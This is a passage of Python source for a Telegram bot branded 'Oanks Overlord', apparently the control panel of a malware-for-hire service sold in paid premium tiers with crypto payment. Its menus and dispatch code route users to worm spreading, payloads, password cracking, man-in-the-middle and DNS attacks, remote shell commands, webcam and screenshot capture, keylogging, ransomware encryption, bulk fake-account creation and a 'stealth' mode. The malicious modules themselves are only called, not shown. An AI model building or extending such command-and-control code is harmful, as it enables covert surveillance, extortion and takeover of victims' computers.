            f"<b>Main Menu</b> — Select a category:\n\n"
            f"{OanksBranding.FOOTER}"
        )
        keyboard = self._build_main_menu_keyboard(session) if session else None
        return OanksCommandResult.ok(welcome, keyboard=keyboard, edit_message=True)

    @oanks_callback("menu_user", "Show user commands menu")
    def cb_menu_user(self, callback_query: Dict[str, Any]) -> str:
        """Show user commands submenu."""
        user_id = callback_query["from"]["id"]
        session = self._get_session(user_id)
        if session: session.push_menu("user")

        user_menu = (
            f"{OanksBranding.BANNER_SMALL}\n\n"
            f"<b>{OanksBranding.EMOJI_USER} USER COMMANDS</b>\n"
            f"<code>═══════════════════════════════════════</code>\n\n"
            f"<b>Available Commands:</b>\n"
            f"  • /start — Welcome message\n"
            f"  • /help — Full command reference\n"
            f"  • /oanks — About the Creator\n"
            f"  • /boss — Admin contact\n"
            f"  • /status — System status\n"
            f"  • /stats — Your statistics\n"
            f"  • /price — Pricing info\n"
            f"  • /premium — Premium features\n"
            f"  • /premium_buy — Purchase premium\n"
            f"  • /premium_status — Your status\n"
            f"  • /referral — Referral link\n"
            f"  • /coupon — Apply coupon\n"
            f"  • /verify — Account verification\n\n"
            f"{OanksBranding.FOOTER}"
        )
        keyboard = [
            [{"text": f"{OanksBranding.EMOJI_INFO} Help", "callback_data": "menu_help"},
             {"text": f"{OanksBranding.EMOJI_STATUS} Status", "callback_data": "menu_status"}],
            [{"text": f"{OanksBranding.EMOJI_PREMIUM} Premium", "callback_data": "menu_premium"},
             {"text": f"{OanksBranding.EMOJI_PRICE} Pricing", "callback_data": "menu_price"}],
            [{"text": f"{OanksBranding.EMOJI_BACK} Back", "callback_data": "menu_main"}]
        ]
        return OanksCommandResult.ok(user_menu, keyboard=keyboard, edit_message=True)

    @oanks_callback("menu_admin", "Show admin panel")
    def cb_menu_admin(self, callback_query: Dict[str, Any]) -> str:
        """Show admin panel."""
        user_id = callback_query["from"]["id"]
        session = self._get_session(user_id)
        if not session or not session.is_admin:
            return OanksCommandResult.error(OanksConfig.ERROR_UNAUTHORIZED)
        if session: session.push_menu("admin")

        admin_text = (
            f"{OanksBranding.BANNER_SMALL}\n\n"
            f"<b>{OanksBranding.EMOJI_ADMIN} 🔥 ADMIN PANEL 🔥</b>\n"
            f"<code>═══════════════════════════════════════</code>\n\n"
            f"<b>Welcome, Administrator.</b>\n"
            f"You have full control over the Overlord.\n\n"
            f"{OanksBranding.FOOTER}"
        )
        keyboard = self._build_admin_menu_keyboard()
        return OanksCommandResult.ok(admin_text, keyboard=keyboard, edit_message=True)

    @oanks_callback("menu_worm", "Show worm module menu")
    def cb_menu_worm(self, callback_query: Dict[str, Any]) -> str:
        """Show worm module menu."""
        user_id = callback_query["from"]["id"]
        session = self._get_session(user_id)
        if not session or not session.is_premium:
            return OanksCommandResult.error(OanksConfig.ERROR_NOT_PREMIUM)
        if session: session.push_menu("worm")

        worm_text = (
            f"{OanksBranding.BANNER_SMALL}\n\n"
            f"<b>{OanksBranding.EMOJI_WORM} WORM MODULE</b>\n"
            f"<code>═══════════════════════════════════════</code>\n\n"
            f"<b>Network domination tools.</b>\n"
            f"Select an operation:\n\n"
            f"{OanksBranding.FOOTER}"
        )
        keyboard = self._build_worm_menu_keyboard()
        return OanksCommandResult.ok(worm_text, keyboard=keyboard, edit_message=True)

    @oanks_callback("menu_shell", "Show shell access menu")
    def cb_menu_shell(self, callback_query: Dict[str, Any]) -> str:
        """Show shell access menu."""
        user_id = callback_query["from"]["id"]
        session = self._get_session(user_id)
        if not session or not session.is_premium:
            return OanksCommandResult.error(OanksConfig.ERROR_NOT_PREMIUM)
        if session: session.push_menu("shell")

        shell_text = (
            f"{OanksBranding.BANNER_SMALL}\n\n"
            f"<b>{OanksBranding.EMOJI_SHELL} SHELL ACCESS</b>\n"
            f"<code>═══════════════════════════════════════</code>\n\n"
            f"<b>Remote system control.</b>\n"
            f"Select an operation:\n\n"
            f"{OanksBranding.FOOTER}"
        )
        keyboard = self._build_shell_menu_keyboard()
        return OanksCommandResult.ok(shell_text, keyboard=keyboard, edit_message=True)

    @oanks_callback("menu_premium", "Show premium menu")
    def cb_menu_premium(self, callback_query: Dict[str, Any]) -> str:
        """Show premium menu."""
        user_id = callback_query["from"]["id"]
        return self.cmd_premium(user_id, [])

    @oanks_callback("menu_price", "Show pricing menu")
    def cb_menu_price(self, callback_query: Dict[str, Any]) -> str:
        """Show pricing menu."""
        user_id = callback_query["from"]["id"]
        return self.cmd_price(user_id, [])

    @oanks_callback("menu_referral", "Show referral menu")
    def cb_menu_referral(self, callback_query: Dict[str, Any]) -> str:
        """Show referral menu."""
        user_id = callback_query["from"]["id"]
        return self.cmd_referral(user_id, [])

    @oanks_callback("menu_status", "Show status menu")
    def cb_menu_status(self, callback_query: Dict[str, Any]) -> str:
        """Show status menu."""
        user_id = callback_query["from"]["id"]
        return self.cmd_status(user_id, [])

    @oanks_callback("menu_stats", "Show statistics menu")
    def cb_menu_stats(self, callback_query: Dict[str, Any]) -> str:
        """Show stats menu."""
        user_id = callback_query["from"]["id"]
        return self.cmd_stats(user_id, [])

    @oanks_callback("menu_help", "Show help menu")
    def cb_menu_help(self, callback_query: Dict[str, Any]) -> str:
        """Show help menu."""
        user_id = callback_query["from"]["id"]
        return self.cmd_help(user_id, [])

    @oanks_callback("menu_oanks", "Show Oanks info menu")
    def cb_menu_oanks(self, callback_query: Dict[str, Any]) -> str:
        """Show Oanks info."""
        user_id = callback_query["from"]["id"]
        return self.cmd_oanks(user_id, [])

    # Admin menu callbacks
    @oanks_callback("admin_menu_users", "Admin: User management")
    def cb_admin_menu_users(self, callback_query: Dict[str, Any]) -> str:
        user_id = callback_query["from"]["id"]
        return self.cmd_admin_users(user_id, [])

    @oanks_callback("admin_menu_premium", "Admin: Premium management")
    def cb_admin_menu_premium(self, callback_query: Dict[str, Any]) -> str:
        user_id = callback_query["from"]["id"]
        return self.cmd_admin_premium_list(user_id, [])

    @oanks_callback("admin_menu_payments", "Admin: Payment management")
    def cb_admin_menu_payments(self, callback_query: Dict[str, Any]) -> str:
        user_id = callback_query["from"]["id"]
        return self.cmd_admin_payments(user_id, [])

    @oanks_callback("admin_menu_coupons", "Admin: Coupon management")
    def cb_admin_menu_coupons(self, callback_query: Dict[str, Any]) -> str:
        user_id = callback_query["from"]["id"]
        return self.cmd_admin_coupon_list(user_id, [])

    @oanks_callback("admin_menu_broadcast", "Admin: Broadcast message")
    def cb_admin_menu_broadcast(self, callback_query: Dict[str, Any]) -> str:
        user_id = callback_query["from"]["id"]
        return self.cmd_admin_broadcast(user_id, [])

    @oanks_callback("admin_menu_logs", "Admin: View logs")
    def cb_admin_menu_logs(self, callback_query: Dict[str, Any]) -> str:
        user_id = callback_query["from"]["id"]
        return self.cmd_admin_logs(user_id, [])

    @oanks_callback("admin_menu_analytics", "Admin: Analytics dashboard")
    def cb_admin_menu_analytics(self, callback_query: Dict[str, Any]) -> str:
        user_id = callback_query["from"]["id"]
        return self.cmd_admin_analytics(user_id, [])

    @oanks_callback("admin_menu_revenue", "Admin: Revenue report")
    def cb_admin_menu_revenue(self, callback_query: Dict[str, Any]) -> str:
        user_id = callback_query["from"]["id"]
        return self.cmd_admin_revenue(user_id, [])

    @oanks_callback("admin_menu_stats", "Admin: Statistics")
    def cb_admin_menu_stats(self, callback_query: Dict[str, Any]) -> str:
        user_id = callback_query["from"]["id"]
        return self.cmd_admin_stats(user_id, [])

    @oanks_callback("admin_menu_backup", "Admin: Create backup")
    def cb_admin_menu_backup(self, callback_query: Dict[str, Any]) -> str:
        user_id = callback_query["from"]["id"]
        return self.cmd_admin_backup(user_id, [])

    @oanks_callback("admin_menu_restart", "Admin: Restart system")
    def cb_admin_menu_restart(self, callback_query: Dict[str, Any]) -> str:
        user_id = callback_query["from"]["id"]
        return self.cmd_admin_restart(user_id, [])

    @oanks_callback("admin_menu_shutdown", "Admin: Shutdown system")
    def cb_admin_menu_shutdown(self, callback_query: Dict[str, Any]) -> str:
        user_id = callback_query["from"]["id"]
        return self.cmd_admin_shutdown(user_id, [])

    @oanks_callback("admin_menu_kill", "Admin: Force kill")
    def cb_admin_menu_kill(self, callback_query: Dict[str, Any]) -> str:
        user_id = callback_query["from"]["id"]
        return self.cmd_admin_kill(user_id, [])

    # Worm menu callbacks
    @oanks_callback("worm_menu_status", "Worm: Status")
    def cb_worm_menu_status(self, callback_query: Dict[str, Any]) -> str:
        user_id = callback_query["from"]["id"]
        return self.cmd_worm_status(user_id, [])

    @oanks_callback("worm_menu_spread", "Worm: Spread")
    def cb_worm_menu_spread(self, callback_query: Dict[str, Any]) -> str:
        user_id = callback_query["from"]["id"]
        return self.cmd_worm_spread(user_id, [])

    @oanks_callback("worm_menu_target", "Worm: Targets")
    def cb_worm_menu_target(self, callback_query: Dict[str, Any]) -> str:
        user_id = callback_query["from"]["id"]
        return self.cmd_worm_target(user_id, [])

    @oanks_callback("worm_menu_payload", "Worm: Payloads")
    def cb_worm_menu_payload(self, callback_query: Dict[str, Any]) -> str:
        user_id = callback_query["from"]["id"]
        return self.cmd_worm_payload(user_id, [])

    @oanks_callback("worm_menu_scan", "Worm: Scan")
    def cb_worm_menu_scan(self, callback_query: Dict[str, Any]) -> str:
        user_id = callback_query["from"]["id"]
        return self.cmd_worm_scan(user_id, [])

    @oanks_callback("worm_menu_crack", "Worm: Crack")
    def cb_worm_menu_crack(self, callback_query: Dict[str, Any]) -> str:
        user_id = callback_query["from"]["id"]
        return self.cmd_worm_crack(user_id, [])

    @oanks_callback("worm_menu_mitm", "Worm: MITM")
    def cb_worm_menu_mitm(self, callback_query: Dict[str, Any]) -> str:
        user_id = callback_query["from"]["id"]
        return self.cmd_worm_mitm(user_id, [])

    @oanks_callback("worm_menu_dns", "Worm: DNS")
    def cb_worm_menu_dns(self, callback_query: Dict[str, Any]) -> str:
        user_id = callback_query["from"]["id"]
        return self.cmd_worm_dns(user_id, [])

    # Shell menu callbacks
    @oanks_callback("shell_menu_shell", "Shell: Command execution")
    def cb_shell_menu_shell(self, callback_query: Dict[str, Any]) -> str:
        user_id = callback_query["from"]["id"]
        return self.cmd_shell(user_id, [])

    @oanks_callback("shell_menu_upload", "Shell: Upload")
    def cb_shell_menu_upload(self, callback_query: Dict[str, Any]) -> str:
        user_id = callback_query["from"]["id"]
        return self.cmd_upload(user_id, [])

    @oanks_callback("shell_menu_download", "Shell: Download")
    def cb_shell_menu_download(self, callback_query: Dict[str, Any]) -> str:
        user_id = callback_query["from"]["id"]
        return self.cmd_download(user_id, [])

    @oanks_callback("shell_menu_screenshot", "Shell: Screenshot")
    def cb_shell_menu_screenshot(self, callback_query: Dict[str, Any]) -> str:
        user_id = callback_query["from"]["id"]
        return self.cmd_screenshot(user_id, [])

    @oanks_callback("shell_menu_webcam", "Shell: Webcam")
    def cb_shell_menu_webcam(self, callback_query: Dict[str, Any]) -> str:
        user_id = callback_query["from"]["id"]
        return self.cmd_webcam(user_id, [])

    @oanks_callback("shell_menu_keylog", "Shell: Keylogger")
    def cb_shell_menu_keylog(self, callback_query: Dict[str, Any]) -> str:
        user_id = callback_query["from"]["id"]
        return self.cmd_keylog_start(user_id, [])

    # Refresh callbacks
    @oanks_callback("status_refresh", "Refresh system status")
    def cb_status_refresh(self, callback_query: Dict[str, Any]) -> str:
        user_id = callback_query["from"]["id"]
        return self.cmd_status(user_id, [])

    @oanks_callback("stats_refresh", "Refresh user stats")
    def cb_stats_refresh(self, callback_query: Dict[str, Any]) -> str:
        user_id = callback_query["from"]["id"]
        return self.cmd_stats(user_id, [])

    @oanks_callback("referral_refresh", "Refresh referral stats")
    def cb_referral_refresh(self, callback_query: Dict[str, Any]) -> str:
        user_id = callback_query["from"]["id"]
        return self.cmd_referral_stats(user_id, [])

    @oanks_callback("referral_stats", "Show referral stats")
    def cb_referral_stats(self, callback_query: Dict[str, Any]) -> str:
        user_id = callback_query["from"]["id"]
        return self.cmd_referral_stats(user_id, [])

    @oanks_callback("premium_buy", "Show premium purchase")
    def cb_premium_buy(self, callback_query: Dict[str, Any]) -> str:
        user_id = callback_query["from"]["id"]
        return self.cmd_premium_buy(user_id, [])

    @oanks_callback("coupon_apply", "Apply coupon")
    def cb_coupon_apply(self, callback_query: Dict[str, Any]) -> str:
        user_id = callback_query["from"]["id"]
        return self.cmd_coupon(user_id, [])

    @oanks_callback("admin_premium_stats_refresh", "Refresh premium stats")
    def cb_admin_premium_stats_refresh(self, callback_query: Dict[str, Any]) -> str:
        user_id = callback_query["from"]["id"]
        return self.cmd_admin_premium_stats(user_id, [])

    @oanks_callback("admin_logs_refresh", "Refresh admin logs")
    def cb_admin_logs_refresh(self, callback_query: Dict[str, Any]) -> str:
        user_id = callback_query["from"]["id"]
        return self.cmd_admin_logs(user_id, [])

    @oanks_callback("admin_status_refresh", "Refresh admin status")
    def cb_admin_status_refresh(self, callback_query: Dict[str, Any]) -> str:
        user_id = callback_query["from"]["id"]
        return self.cmd_admin_status(user_id, [])

    @oanks_callback("admin_analytics_refresh", "Refresh analytics")
    def cb_admin_analytics_refresh(self, callback_query: Dict[str, Any]) -> str:
        user_id = callback_query["from"]["id"]
        return self.cmd_admin_analytics(user_id, [])

    @oanks_callback("admin_revenue_refresh", "Refresh revenue")
    def cb_admin_revenue_refresh(self, callback_query: Dict[str, Any]) -> str:
        user_id = callback_query["from"]["id"]
        return self.cmd_admin_revenue(user_id, [])

    @oanks_callback("admin_stats_refresh", "Refresh admin stats")
    def cb_admin_stats_refresh(self, callback_query: Dict[str, Any]) -> str:
        user_id = callback_query["from"]["id"]
        return self.cmd_admin_stats(user_id, [])

    @oanks_callback("admin_coupon_list_refresh", "Refresh coupon list")
    def cb_admin_coupon_list_refresh(self, callback_query: Dict[str, Any]) -> str:
        user_id = callback_query["from"]["id"]
        return self.cmd_admin_coupon_list(user_id, [])

    # Pagination callbacks
    @oanks_callback("admin_users", "Admin user pagination")
    def cb_admin_users_page(self, callback_query: Dict[str, Any]) -> str:
        user_id = callback_query["from"]["id"]
        params = callback_query.get("params", [])
        if len(params) >= 2 and params[0] == "page":
            try: page = int(params[1])
            except: page = 0
            return self.cmd_admin_users(user_id, [str(page + 1)])
        return self.cmd_admin_users(user_id, [])

    @oanks_callback("admin_payments", "Admin payment pagination")
    def cb_admin_payments_page(self, callback_query: Dict[str, Any]) -> str:
        user_id = callback_query["from"]["id"]
        params = callback_query.get("params", [])
        if len(params) >= 2 and params[0] == "page":
            try: page = int(params[1])
            except: page = 0
            return self.cmd_admin_payments(user_id, [str(page + 1)])
        return self.cmd_admin_payments(user_id, [])

    @oanks_callback("admin_premium_list", "Admin premium pagination")
    def cb_admin_premium_list_page(self, callback_query: Dict[str, Any]) -> str:
        user_id = callback_query["from"]["id"]
        params = callback_query.get("params", [])
        if len(params) >= 2 and params[0] == "page":
            try: page = int(params[1])
            except: page = 0
            return self.cmd_admin_premium_list(user_id, [str(page + 1)])
        return self.cmd_admin_premium_list(user_id, [])

    # Premium tier callbacks
    @oanks_callback("premium_tier", "Select premium tier")
    def cb_premium_tier(self, callback_query: Dict[str, Any]) -> str:
        user_id = callback_query["from"]["id"]
        params = callback_query.get("params", [])
        tier = params[0] if params else "bronze"
        tier_prices = {"bronze": "$9.99", "silver": "$24.99", "gold": "$49.99", "platinum": "$99.99"}
        price = tier_prices.get(tier, "$9.99")

        return OanksCommandResult.ok(
            f"{OanksBranding.BANNER_SMALL}\n\n"
            f"<b>💎 PREMIUM TIER SELECTED</b>\n"
            f"<code>═══════════════════════════════════════</code>\n\n"
            f"<b>Tier:</b> {html.escape(tier.upper())}\n"
            f"<b>Price:</b> {price}/month\n\n"
            f"<b>Next Steps:</b>\n"
            f"  1. Contact @oanksnood for payment\n"
            f"  2. Send payment confirmation\n"
            f"  3. Admin will activate your subscription\n\n"
            f"<b>Payment Methods:</b>\n"
            f"  • BTC, ETH, XMR (Crypto)\n"
            f"  • PayPal\n"
            f"  • Credit Card\n\n"
            f"{OanksBranding.FOOTER}",
            keyboard=[[{"text": f"{OanksBranding.EMOJI_BACK} Back", "callback_data": "menu_main"}]]
        )

    # File action callbacks
    @oanks_callback("file_analyze", "Analyze uploaded file")
    def cb_file_analyze(self, callback_query: Dict[str, Any]) -> str:
        user_id = callback_query["from"]["id"]
        params = callback_query.get("params", [])
        cache_key = params[0] if params else ""

        with self._file_cache_lock:
            file_upload = self._file_cache.get(cache_key)

        if not file_upload:
            return OanksCommandResult.error("File not found in cache.")

        parsed = file_upload.parsed_data
        if isinstance(parsed, list) and parsed:
            # CSV analysis
            columns = list(parsed[0].keys()) if parsed else []
            row_count = len(parsed)

            return OanksCommandResult.ok(
                f"<b>{OanksBranding.EMOJI_STATS} CSV ANALYSIS</b>\n\n"
                f"<b>File:</b> {html.escape(file_upload.file_name)}\n"
                f"<b>Rows:</b> {row_count}\n"
                f"<b>Columns:</b> {len(columns)}\n"
                f"<b>Column Names:</b> {', '.join(html.escape(c) for c in columns)}\n\n"
                f"<b>First 3 Rows:</b>\n"
                f"<pre>{html.escape(str(parsed[:3]))}</pre>\n\n"
                f"{OanksBranding.FOOTER}",
                keyboard=[[{"text": f"{OanksBranding.EMOJI_BACK} Back", "callback_data": "menu_main"}]]
            )

        return OanksCommandResult.ok(
            f"<b>{OanksBranding.EMOJI_STATS} FILE ANALYSIS</b>\n\n"
            f"<b>File:</b> {html.escape(file_upload.file_name)}\n"
            f"<b>Analysis complete.</b>\n\n"
            f"{OanksBranding.FOOTER}",
            keyboard=[[{"text": f"{OanksBranding.EMOJI_BACK} Back", "callback_data": "menu_main"}]]
        )

    @oanks_callback("file_import", "Import uploaded file")
    def cb_file_import(self, callback_query: Dict[str, Any]) -> str:
        return OanksCommandResult.ok(
            f"<b>{OanksBranding.EMOJI_UPLOAD} FILE IMPORT</b>\n\n"
            f"File import initiated.\n"
            f"Data will be processed by the appropriate phase module.\n\n"
            f"{OanksBranding.FOOTER}",
            keyboard=[[{"text": f"{OanksBranding.EMOJI_BACK} Back", "callback_data": "menu_main"}]]
        )

    @oanks_callback("file_validate", "Validate uploaded JSON")
    def cb_file_validate(self, callback_query: Dict[str, Any]) -> str:
        user_id = callback_query["from"]["id"]
        params = callback_query.get("params", [])
        cache_key = params[0] if params else ""

        with self._file_cache_lock:
            file_upload = self._file_cache.get(cache_key)

        if not file_upload:
            return OanksCommandResult.error("File not found in cache.")

        parsed = file_upload.parsed_data
        is_valid = isinstance(parsed, (dict, list))

        return OanksCommandResult.ok(
            f"<b>{OanksBranding.EMOJI_JSON} JSON VALIDATION</b>\n\n"
            f"<b>File:</b> {html.escape(file_upload.file_name)}\n"
            f"<b>Valid JSON:</b> {'✅ Yes' if is_valid else '❌ No'}\n"
            f"<b>Type:</b> {type(parsed).__name__ if parsed else 'None'}\n\n"
            f"{OanksBranding.FOOTER}",
            keyboard=[[{"text": f"{OanksBranding.EMOJI_BACK} Back", "callback_data": "menu_main"}]]
        )

    @oanks_callback("file_download", "Download uploaded file")
    def cb_file_download(self, callback_query: Dict[str, Any]) -> str:
        user_id = callback_query["from"]["id"]
        params = callback_query.get("params", [])
        cache_key = params[0] if params else ""

        with self._file_cache_lock:
            file_upload = self._file_cache.get(cache_key)

        if not file_upload or not file_upload.content:
            return OanksCommandResult.error("File not found in cache.")

        return OanksCommandResult.ok(
            f"<b>{OanksBranding.EMOJI_DOWNLOAD} FILE DOWNLOAD</b>\n\n"
            f"<b>File:</b> {html.escape(file_upload.file_name)}\n"
            f"<b>Size:</b> {self._format_bytes(len(file_upload.content))}\n\n"
            f"{OanksBranding.FOOTER}",
            file_content=file_upload.content,
            file_name=file_upload.file_name,
            keyboard=[[{"text": f"{OanksBranding.EMOJI_BACK} Back", "callback_data": "menu_main"}]]
        )

    @oanks_callback("file_delete", "Delete uploaded file from cache")
    def cb_file_delete(self, callback_query: Dict[str, Any]) -> str:
        user_id = callback_query["from"]["id"]
        params = callback_query.get("params", [])
        cache_key = params[0] if params else ""

        with self._file_cache_lock:
            if cache_key in self._file_cache:
                del self._file_cache[cache_key]

        return OanksCommandResult.ok(
            f"<b>{OanksBranding.EMOJI_CROSS} FILE DELETED</b>\n\n"
            f"File removed from cache.\n\n"
            f"{OanksBranding.FOOTER}",
            keyboard=[[{"text": f"{OanksBranding.EMOJI_BACK} Back", "callback_data": "menu_main"}]]
        )

    @oanks_callback("noop", "No operation")
    def cb_noop(self, callback_query: Dict[str, Any]) -> str:
        return OanksCommandResult.ok("")

    # ═══════════════════════════════════════════════════════════════════════════════
    # FLOW HANDLERS — MULTI-STEP COMMAND FLOWS
    # ═══════════════════════════════════════════════════════════════════════════════

    def _flow_broadcast(self, telegram_id: int, step: int, text: str, flow_data: Dict) -> OanksCommandResult:
        """Handle broadcast flow."""
        if step == 0:
            # Confirm broadcast
            flow_data["message"] = text
            flow_data["step"] = 1
            session = self._get_session(telegram_id)
            if session:
                session.context["awaiting_input"] = True
                session.context["flow_type"] = "broadcast"
                session.context["flow_data"] = flow_data

            return OanksCommandResult.ok(
                f"<b>{OanksBranding.EMOJI_BROADCAST} BROADCAST CONFIRMATION</b>\n\n"
                f"<b>Message:</b>\n"
                f"<pre>{html.escape(text[:500])}</pre>\n\n"
                f"<b>Targets:</b> ALL ACTIVE USERS\n\n"
                f"Type <b>CONFIRM</b> to send, or <b>CANCEL</b> to abort.\n\n"
                f"{OanksBranding.FOOTER}"
            )
        elif step == 1:
            if text.upper() == "CONFIRM":
                message = flow_data.get("message", "")
                return self.cmd_admin_broadcast(telegram_id, message.split())
            else:
                return OanksCommandResult.ok(
                    f"<b>{OanksBranding.EMOJI_BROADCAST} BROADCAST CANCELLED</b>\n\n"
                    f"No message was sent.\n\n"
                    f"{OanksBranding.FOOTER}"
                )
        return OanksCommandResult.error("Invalid flow state.")

    def _flow_coupon_create(self, telegram_id: int, step: int, text: str, flow_data: Dict) -> OanksCommandResult:
        """Handle coupon creation flow."""
        if step == 0:
            flow_data["code"] = text.upper()
            flow_data["step"] = 1
            session = self._get_session(telegram_id)
            if session:
                session.context["awaiting_input"] = True
                session.context["flow_type"] = "coupon_create"
                session.context["flow_data"] = flow_data
            return OanksCommandResult.ok(
                f"<b>{OanksBranding.EMOJI_COUPON} CREATE COUPON</b>\n\n"
                f"<b>Code:</b> <code>{html.escape(text.upper())}</code>\n\n"
                f"Now enter the discount percentage (e.g., 20 for 20%):\n\n"
                f"{OanksBranding.FOOTER}"
            )
        elif step == 1:
            try:
                discount = float(text)
                flow_data["discount"] = discount
                flow_data["step"] = 2
                session = self._get_session(telegram_id)
                if session:
                    session.context["awaiting_input"] = True
                    session.context["flow_type"] = "coupon_create"
                    session.context["flow_data"] = flow_data
                return OanksCommandResult.ok(
                    f"<b>{OanksBranding.EMOJI_COUPON} CREATE COUPON</b>\n\n"
                    f"<b>Code:</b> <code>{html.escape(flow_data.get('code', ''))}</code>\n"
                    f"<b>Discount:</b> {discount}%\n\n"
                    f"Enter a description for this coupon:\n\n"
                    f"{OanksBranding.FOOTER}"
                )
            except ValueError:
                return OanksCommandResult.error("Invalid discount. Please enter a number.")
        elif step == 2:
            code = flow_data.get("code", "")
            discount = flow_data.get("discount", 0)
            return self.cmd_admin_coupon_create(telegram_id, [code, str(discount), text])
        return OanksCommandResult.error("Invalid flow state.")

    def _flow_admin_ban(self, telegram_id: int, step: int, text: str, flow_data: Dict) -> OanksCommandResult:
        """Handle admin ban flow."""
        if step == 0:
            try:
                target_id = int(text)
                flow_data["target_id"] = target_id
                flow_data["step"] = 1
                session = self._get_session(telegram_id)
                if session:
                    session.context["awaiting_input"] = True
                    session.context["flow_type"] = "admin_ban"
                    session.context["flow_data"] = flow_data
                return OanksCommandResult.ok(
                    f"<b>{OanksBranding.EMOJI_ADMIN} BAN USER</b>\n\n"
                    f"<b>Target ID:</b> <code>{target_id}</code>\n\n"
                    f"Enter the ban reason:\n\n"
                    f"{OanksBranding.FOOTER}"
                )
            except ValueError:
                return OanksCommandResult.error("Invalid user ID. Please enter a number.")
        elif step == 1:
            target_id = flow_data.get("target_id", 0)
            return self.cmd_admin_ban(telegram_id, [str(target_id), text])
        return OanksCommandResult.error("Invalid flow state.")

    def _flow_shell_command(self, telegram_id: int, step: int, text: str, flow_data: Dict) -> OanksCommandResult:
        """Handle shell command flow."""
        return self.cmd_shell(telegram_id, text.split())

    def _flow_worm_target(self, telegram_id: int, step: int, text: str, flow_data: Dict) -> OanksCommandResult:
        """Handle worm target flow."""
        return self.cmd_worm_target(telegram_id, ["add", text])

    # ═══════════════════════════════════════════════════════════════════════════════
    # INTER-PHASE COMMUNICATION BRIDGES
    # ═══════════════════════════════════════════════════════════════════════════════

    def _call_phase1(self, action: str, **kwargs) -> Dict:
        """Call Phase 1 (Database/Logging/Crypto)."""
        if not self._db:
            raise OanksPhaseException("Phase 1 (Database) is not available", phase="1")
        try:
            if action == "query": return self._db.query(**kwargs)
            elif action == "execute": return self._db.execute(**kwargs)
            elif action == "log": return self._db.log(**kwargs)
            elif action == "encrypt": return self._db.encrypt(**kwargs)
            elif action == "decrypt": return self._db.decrypt(**kwargs)
            else: return {"success": False, "error": f"Unknown action: {action}"}
        except Exception as e:
            raise OanksPhaseException(f"Phase 1 error: {str(e)}", phase="1")

    def _call_phase5(self, action: str, **kwargs) -> Dict:
        """Call Phase 5 (Account Factory)."""
        if not self._account_factory:
            raise OanksPhaseException("Phase 5 (Account Factory) is not available", phase="5")
        try:
            if action == "create": return self._account_factory.run_sequential_creation(**kwargs)
            elif action == "bulk_create": return self._account_factory.run_bulk_creation(**kwargs)
            elif action == "status": return self._account_factory.get_status(**kwargs)
            else: return {"success": False, "error": f"Unknown action: {action}"}
        except Exception as e:
            raise OanksPhaseException(f"Phase 5 error: {str(e)}", phase="5")

    def _call_phase6(self, action: str, **kwargs) -> Dict:
        """Call Phase 6 (Premium System)."""
        if not self._premium_mgr:
            raise OanksPhaseException("Phase 6 (Premium) is not available", phase="6")
        try:
            if action == "check": return self._premium_mgr.check_premium(**kwargs)
            elif action == "add": return self._premium_mgr.add_premium(**kwargs)
            elif action == "remove": return self._premium_mgr.remove_premium(**kwargs)
            elif action == "list": return self._premium_mgr.list_premium_users(**kwargs)
            elif action == "stats": return self._premium_mgr.get_stats(**kwargs)
            else: return {"success": False, "error": f"Unknown action: {action}"}
        except Exception as e:
            raise OanksPhaseException(f"Phase 6 error: {str(e)}", phase="6")

    def _call_phase8(self, action: str, **kwargs) -> Dict:
        """Call Phase 8 (Money Module)."""
        if not self._money_module:
            raise OanksPhaseException("Phase 8 (Money) is not available", phase="8")
        try:
            if action == "revenue": return self._money_module.get_revenue_report(**kwargs)
            elif action == "pricing": return self._money_module.get_pricing(**kwargs)
            elif action == "process": return self._money_module.process_payment(**kwargs)
            else: return {"success": False, "error": f"Unknown action: {action}"}
        except Exception as e:
            raise OanksPhaseException(f"Phase 8 error: {str(e)}", phase="8")

    def _call_phase9(self, action: str, **kwargs) -> Dict:
        """Call Phase 9 (Security)."""
        if not self._security_module:
            raise OanksPhaseException("Phase 9 (Security) is not available", phase="9")
        try:
            if action == "encrypt": return self._security_module.encrypt(**kwargs)
            elif action == "decrypt": return self._security_module.decrypt(**kwargs)
            elif action == "hash": return self._security_module.hash(**kwargs)
            elif action == "stealth": return self._security_module.stealth_mode(**kwargs)
            else: return {"success": False, "error": f"Unknown action: {action}"}
        except Exception as e:
            raise OanksPhaseException(f"Phase 9 error: {str(e)}", phase="9")

    def _call_phase10(self, action: str, **kwargs) -> Dict:
        """Call Phase 10 (Worm Module)."""
        if not self._worm_module:
            raise OanksPhaseException("Phase 10 (Worm) is not available", phase="10")
        try:
            return self._worm_module.execute(action, **kwargs)
        except Exception as e:
            raise OanksPhaseException(f"Phase 10 error: {str(e)}", phase="10")

    def _call_phase11(self, action: str, **kwargs) -> Dict:
        """Call Phase 11 (Ransomware)."""
        if not self._ransom_module:
            raise OanksPhaseException("Phase 11 (Ransomware) is not available", phase="11")
        try:
            if action == "encrypt": return self._ransom_module.encrypt(**kwargs)
            elif action == "decrypt": return self._ransom_module.decrypt(**kwargs)
            elif action == "status": return self._ransom_module.get_status(**kwargs)
            else: return {"success": False, "error": f"Unknown action: {action}"}
        except Exception as e:
            raise OanksPhaseException(f"Phase 11 error: {str(e)}", phase="11")

    def _call_phase12(self, action: str, **kwargs) -> Dict:
        """Call Phase 12 (Distributed Ops)."""
        if not self._distributed_module:
            raise OanksPhaseException("Phase 12 (Distributed) is not available", phase="12")
        try:
            if action == "nodes": return self._distributed_module.list_nodes(**kwargs)
            elif action == "deploy": return self._distributed_module.deploy(**kwargs)
            elif action == "status": return self._distributed_module.get_status(**kwargs)
            else: return {"success": False, "error": f"Unknown action: {action}"}
        except Exception as e:
            raise OanksPhaseException(f"Phase 12 error: {str(e)}", phase="12")

    def _call_phase13(self, action: str, **kwargs) -> Dict:
        """Call Phase 13 (Darkweb Intelligence)."""
        if not self._darkweb_module:
            raise OanksPhaseException("Phase 13 (Darkweb) is not available", phase="13")
        try:
            if action == "search": return self._darkweb_module.search(**kwargs)
            elif action == "monitor": return self._darkweb_module.monitor(**kwargs)
            elif action == "alert": return self._darkweb_module.get_alerts(**kwargs)
            else: return {"success": False, "error": f"Unknown action: {action}"}
        except Exception as e:
            raise OanksPhaseException(f"Phase 13 error: {str(e)}", phase="13")

    def _call_phase14(self, action: str, **kwargs) -> Dict:
        """Call Phase 14 (AI Assistant)."""
        if not self._ai_module:
            raise OanksPhaseException("Phase 14 (AI) is not available", phase="14")
        try:
            if action == "decide": return self._ai_module.auto_decide(**kwargs)
            elif action == "analyze": return self._ai_module.analyze(**kwargs)
            elif action == "predict": return self._ai_module.predict(**kwargs)
            elif action == "transcribe": return self._ai_module.transcribe_audio(**kwargs)
